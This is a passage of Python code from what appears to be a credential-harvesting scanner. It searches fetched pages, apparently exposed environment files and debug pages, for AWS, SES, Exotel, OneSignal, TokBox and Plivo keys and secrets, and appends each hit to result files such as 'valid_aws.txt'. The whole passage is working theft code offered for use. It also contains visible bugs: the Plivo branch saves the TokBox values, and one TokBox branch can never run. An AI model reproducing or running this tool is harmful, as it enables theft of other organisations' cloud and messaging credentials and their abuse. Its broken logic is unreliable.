                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = 'us-east-2'
                    except:
                        aws_reg = 'us-east-2'
                if aws_key == '' and aws_sec == '':
                    return False
                else:
                    build = aws_key + '|' + aws_sec + '|' + aws_reg
                    if "||" in build:
                        return False
                    remover = str(build).replace('\r', '').replace('"', "")
                    save2 = open('Results/valid_aws.txt', 'a')
                    save2.write(remover + '\n')
                    save2.close()
                    return aws_key, aws_sec, aws_reg
            elif "SES_KEY" in page:
                if "SES_KEY=" in page:
                    try:
                        aws_key = reg("SES_KEY=(.*?)\n", page)[0].replace('"', "").replace("'", "").replace(
                            ' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("SES_SECRET=(.*?)\n", page)[0].replace('"', "").replace("'", "").replace(
                            ' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = 'us-east-2'
                    except:
                        aws_reg = 'us-east-2'
                elif "<td>SES_KEY</td>" in page:
                    try:
                        aws_key = reg("<td>SES_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>SES_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            '"', "").replace("'", "").replace(' ', "").replace("\n", "").replace("\r", "")
                    except:
                        aws_sec = ''
                    try:
                        asu = self.get_aws_region(page)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = 'us-east-2'
                    except:
                        aws_reg = 'us-east-2'
                if aws_key == '' and aws_sec == '':
                    return False
                else:
                    build = aws_key + '|' + aws_sec + '|' + aws_reg
                    if "||" in build:
                        return False
                    remover = str(build).replace('\r', '').replace('"', "")
                    save2 = open('Results/valid_aws.txt', 'a')
                    save2.write(remover + '\n')
                    save2.close()
                    return aws_key, aws_sec, aws_reg
            else:
                return False
        except Exception as e:
            return False

    def get_sms_apis(self, page):
        global exotel_api, exotel_token, exotel_sid, onesignal_auth, onesignal_token, exotel_sid, tokbox_key, \
            tokbox_secret, plivo_auth, plivo_secret, onesignal_id
        try:
            if "EXOTEL_API_KEY" in page:
                if "EXOTEL_API_KEY=" in page:
                    try:
                        exotel_api = reg('EXOTEL_API_KEY=(.*?)\n', page)[0]
                    except:
                        exotel_api = ''
                    try:
                        exotel_token = reg('EXOTEL_API_TOKEN=(.*?)\n', page)[0]
                    except:
                        exotel_token = ''
                    try:
                        exotel_sid = reg('EXOTEL_API_SID=(.*?)\n', page)[0]
                    except:
                        exotel_sid = ''
                elif '<td>EXOTEL_API_KEY</td>' in page:
                    try:
                        exotel_api = reg('<td>EXOTEL_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        exotel_api = ''
                    try:
                        exotel_token = reg('<td>EXOTEL_API_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        exotel_token = ''
                    try:
                        exotel_sid = reg('<td>EXOTEL_API_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        exotel_sid = ''
                if exotel_api == '' or exotel_token == '' or exotel_api == 'null' or exotel_token == 'null' or \
                        exotel_api == '""' or exotel_token == '""':
                    return False
                else:
                    build = exotel_api + '|' + exotel_token + "|" + exotel_sid
                    remover = build.replace('\r', '')
                    exo = open("Results/exotel.txt", "a")
                    exo.write(remover + '\n')
                    exo.close()
                    return True
            elif "ONESIGNAL_APP_ID" in page:
                if "ONESIGNAL_APP_ID=" in page:
                    try:
                        onesignal_id = reg('ONESIGNAL_APP_ID=(.*?)\n', page)[0]
                    except:
                        onesignal_id = ''
                    try:
                        onesignal_token = reg('ONESIGNAL_REST_API_KEY=(.*?)\n', page)[0]
                    except:
                        onesignal_token = ''
                    try:
                        onesignal_auth = reg('ONESIGNAL_USER_AUTH_KEY=(.*?)\n', page)[0]
                    except:
                        onesignal_auth = ''
                elif '<td>ONESIGNAL_APP_ID</td>' in page:
                    try:
                        onesignal_id = reg('<td>ONESIGNAL_APP_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        onesignal_id = ''
                    try:
                        onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        onesignal_token = ''
                    try:
                        onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        onesignal_auth = ''
                if onesignal_auth == '' or onesignal_token == '' or onesignal_auth == 'null' or onesignal_token == \
                        'null' or onesignal_auth == '""' or onesignal_token == '""':
                    return False
                else:
                    build = onesignal_auth + '|' + onesignal_token + "|" + onesignal_id
                    remover = build.replace('\r', '')
                    one = open("Results/onesignal.txt", "a")
                    one.write(remover + '\n')
                    one.close()
                    return True
            elif "TOKBOX_KEY_DEV" in page:
                if "TOKBOX_KEY_DEV=" in page:
                    try:
                        tokbox_key = reg('TOKBOX_KEY_DEV=(.*?)\n', page)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('TOKBOX_SECRET_DEV=(.*?)\n', page)[0]
                    except:
                        tokbox_secret = ''
                elif '<td>TOKBOX_KEY_DEV</td>' in page:
                    try:
                        tokbox_key = reg('<td>TOKBOX_KEY_DEV<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        tokbox_secret = ''
                if tokbox_key == '' or tokbox_secret == '' or tokbox_key == 'null' or tokbox_secret == \
                        'null' or tokbox_key == '""' or tokbox_secret == '""':
                    return False
                else:
                    build = tokbox_key + '|' + tokbox_secret
                    remover = build.replace('\r', '')
                    tok = open("Results/tokbox.txt", "a")
                    tok.write(remover + '\n')
                    tok.close()
                    return True
            elif "TOKBOX_KEY" in page:
                if "TOKBOX_KEY=" in page:
                    try:
                        tokbox_key = reg('TOKBOX_KEY=(.*?)\n', page)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('TOKBOX_SECRET=(.*?)\n', page)[0]
                    except:
                        tokbox_secret = ''
                elif '<td>TOKBOX_KEY</td>' in page:
                    try:
                        tokbox_key = reg('<td>TOKBOX_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('<td>TOKBOX_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        tokbox_secret = ''
                if tokbox_key == '' or tokbox_secret == '' or tokbox_key == 'null' or tokbox_secret == \
                        'null' or tokbox_key == '""' or tokbox_secret == '""':
                    return False
                else:
                    build = tokbox_key + '|' + tokbox_secret
                    remover = build.replace('\r', '')
                    tok = open("Results/tokbox.txt", "a")
                    tok.write(remover + '\n')
                    tok.close()
                    return True
            elif "TOKBOX_KEY_OLD" in page:
                if "TOKBOX_KEY_OLD=" in page:
                    try:
                        tokbox_key = reg('TOKBOX_KEY_OLD=(.*?)\n', page)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('TOKBOX_SECRET_OLD=(.*?)\n', page)[0]
                    except:
                        tokbox_secret = ''
                elif '<td>TOKBOX_KEY_OLD</td>' in page:
                    try:
                        tokbox_key = reg('<td>TOKBOX_KEY_OLD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('<td>TOKBOX_SECRET_OLD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        tokbox_secret = ''
                if tokbox_key == '' or tokbox_secret == '' or tokbox_key == 'null' or tokbox_secret == \
                        'null' or tokbox_key == '""' or tokbox_secret == '""':
                    return False
                else:
                    build = tokbox_key + '|' + tokbox_secret
                    remover = build.replace('\r', '')
                    tok = open("Results/tokbox.txt", "a")
                    tok.write(remover + '\n')
                    tok.close()
                    return True
            elif "PLIVO_AUTH_ID" in page:
                if "PLIVO_AUTH_ID=" in page:
                    try:
                        plivo_auth = reg('PLIVO_AUTH_ID=(.*?)\n', page)[0]
                    except:
                        plivo_auth = ''
                    try:
                        plivo_secret = reg('PLIVO_AUTH_TOKEN=(.*?)\n', page)[0]
                    except:
                        plivo_secret = ''
                elif '<td>PLIVO_AUTH_ID</td>' in page:
                    try:
                        plivo_auth = reg('<td>PLIVO_AUTH_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        plivo_auth = ''
                    try:
                        plivo_secret = reg('<td>PLIVO_AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0]
                    except:
                        plivo_secret = ''
                if plivo_auth == '' or plivo_secret == '' or plivo_auth == 'null' or plivo_secret == \
                        'null' or plivo_auth == '""' or plivo_secret == '""':
                    return False
                else:
                    build = tokbox_key + '|' + tokbox_secret
                    remover = build.replace('\r', '')
                    pliv = open("Results/tokbox.txt", "a")
                    pliv.write(remover + '\n')
                    pliv.close()
                    return True
            else:
                return False
        except:
            return False